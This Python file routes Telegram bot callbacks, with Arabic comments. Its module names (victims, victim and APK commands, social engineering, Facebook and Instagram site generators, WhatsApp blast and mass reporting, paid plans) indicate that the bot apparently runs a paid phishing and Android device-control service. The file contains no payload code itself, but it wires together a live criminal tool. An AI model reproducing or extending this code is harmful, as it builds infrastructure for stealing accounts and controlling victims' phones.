# bot_handlers/callbacks/router.py
# ============================================================
# Router v5 — مع WhatsApp Blast + WhatsApp Report
# ============================================================

from config import bot
from logging_config import get_logger
from monitoring import metrics

logger = get_logger("bot_handlers.callbacks.router")

from . import help as help_cb
from . import search as search_cb
from . import facebook as fb_cb
from . import instagram as ig_cb
from . import silent as silent_cb
from . import dashboard as dash_cb
from . import victims as victims_cb
from . import victim_commands as vcmd_cb
from . import apk_commands as apk_cmd_cb
from . import updates as upd_cb
from . import payment as payment_cb
from . import admin as admin_cb
from . import misc as misc_cb
from . import social_engineering as se_cb
from . import points as points_cb
from . import wa_report as wa_report_cb     # ← جديد


# ============================================================
# WhatsApp Blast Handler
# ============================================================
try:
    from admin_tools.whatsapp_blast.bot_handlers_real import handle_wb_callback
    WB_AVAILABLE = True
    logger.info("[router] WhatsApp Blast handler loaded")
except Exception as e:
    WB_AVAILABLE = False
    logger.warning(f"[router] WhatsApp Blast not available: {e}")

    def handle_wb_callback(call, chat_id, user_id, data):
        bot.answer_callback_query(call.id, "❌ WhatsApp Blast غير متاح", show_alert=True)


# ============================================================
# ROUTES
# ============================================================
ROUTES = [
    # ═══ 0. WhatsApp Blast ═══
    (lambda d: d == "admin_wb_menu" or d.startswith("wbr_"), handle_wb_callback),

    # ═══ 0.5. WhatsApp Report ═══ (جديد)
    (lambda d: d == "wa_report_start"
              or d == "wa_report_help"
              or d == "wa_report_templates"
              or d == "wa_report_history"
              or d.startswith("wa_reason_")
              or d.startswith("wa_report_sent_")
              or d.startswith("wa_report_finish_"),
     wa_report_cb.handle),

    # ═══ 1. Points / Settings ═══
    (lambda d: d == "settings_menu"
              or d == "points_menu"
              or d.startswith("my_referral")
              or d.startswith("points_")
              or d == "how_to_earn"
              or d == "my_referrals"
              or d.startswith("tool_confirm_"), points_cb.handle),

    # ═══ 2. Social Engineering ═══
    (lambda d: d == "gen_se" or d.startswith("se_"), se_cb.handle),

    # ═══ 3. Misc ═══
    (lambda d: d == "noop", misc_cb.handle),
    (lambda d: d == "back_to_main", misc_cb.handle),

    # ═══ 4. Help ═══
    (lambda d: d == "help_guide" or d.startswith("help_page_"), help_cb.handle),

    # ═══ 5. Search ═══
    (lambda d: d == "search_menu" or d.startswith("search_"), search_cb.handle),

    # ═══ 6. Facebook ═══
    (lambda d: d == "gen_fb" or d.startswith("fb_site_") or d.startswith("fb_stats_"), fb_cb.handle),

    # ═══ 7. Instagram ═══
    (lambda d: d == "gen_ig" or d.startswith("ig_site_") or d.startswith("ig_stats_"), ig_cb.handle),

    # ═══ 8. Silent ═══
    (lambda d: d in ("gen_silent", "silent_new", "silent_stats", "silent_recent"), silent_cb.handle),

    # ═══ 9. Dashboard ═══
    (lambda d: d == "open_dashboard", dash_cb.handle),

    # ═══ 10. Payment / My Account ═══
    (lambda d: d in ("payment_menu", "show_plans", "my_account") or d.startswith("buy_plan_"), payment_cb.handle),

    # ═══ 11. Updates ═══
    (lambda d: d.startswith("upd_"), upd_cb.handle),

    # ═══ 12. Admin ═══
    (lambda d: d == "admin_panel" or d.startswith("admin_"), admin_cb.handle),

    # ═══ 13-14. Victim / APK Commands ═══
    (lambda d: d.startswith("vcmd_"), vcmd_cb.handle),
    (lambda d: d.startswith("apk_cmd_"), apk_cmd_cb.handle),
    (lambda d: d.startswith("v_"), victims_cb.handle),
]


# ============================================================
# Callback Handler الرئيسي
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data

    try:
        for matcher, handler in ROUTES:
            try:
                if matcher(data):
                    handler(call, chat_id, user_id, data)
                    return
            except Exception as e:
                logger.exception(f"route match error for {data}: {e}")
                continue

        logger.warning(f"Unhandled callback: {data}")
        bot.answer_callback_query(call.id)

    except Exception as e:
        logger.exception(f"callback handler error: {e}")
        metrics.inc_counter("bot_errors", tags={"type": "callback"})
